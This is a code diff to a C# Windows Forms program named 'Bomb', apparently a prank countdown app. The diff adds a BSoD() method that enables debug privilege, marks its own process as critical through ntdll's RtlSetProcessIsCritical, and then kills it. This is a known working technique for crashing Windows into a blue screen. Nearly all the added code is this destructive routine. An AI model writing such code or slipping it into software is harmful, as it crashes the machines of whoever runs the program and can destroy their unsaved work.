@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace Bomb
@@ -28,6 +30,17 @@ namespace Bomb
                 if (time_given ?? false) Application.Run(new MainForm());
                 else Application.Run(new MainForm(time));
             Application.Run(new FullScreenForm());
+        }
+
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern void RtlSetProcessIsCritical(int v1, UInt32 v2, UInt32 v3);
+
+        public static void BSoD()
+        {
+            Process.EnterDebugMode();
+            RtlSetProcessIsCritical(1, 0, 0);
+            Process.GetCurrentProcess().Kill();
         }
     }
 }
